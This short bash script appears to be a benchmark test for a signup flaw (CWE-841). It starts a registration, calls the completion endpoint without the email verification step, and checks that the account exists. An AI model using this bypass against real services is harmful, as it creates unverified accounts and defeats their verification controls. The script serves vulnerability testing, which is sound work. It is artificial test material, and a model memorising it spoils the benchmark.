#!/usr/bin/env bash
# SIGNUP-STEPSKIP-001 (CWE-841): complete without verifying registers a user.
set -eu; . "$(dirname "$0")/_lib.sh"
EMAIL="skipper-$$@bench.local"
DRAFT=$(curl -s -X POST "$TARGET/api/signup/start" -H 'content-type: application/json' -d "{\"email\":\"$EMAIL\"}" | json_get draftId)
[ -n "$DRAFT" ]
curl -s -X POST "$TARGET/api/signup/complete" -H 'content-type: application/json' -d "{\"draftId\":$DRAFT,\"password\":\"Skipped123!\"}" >/dev/null
[ -n "$(user_id "$EMAIL")" ]
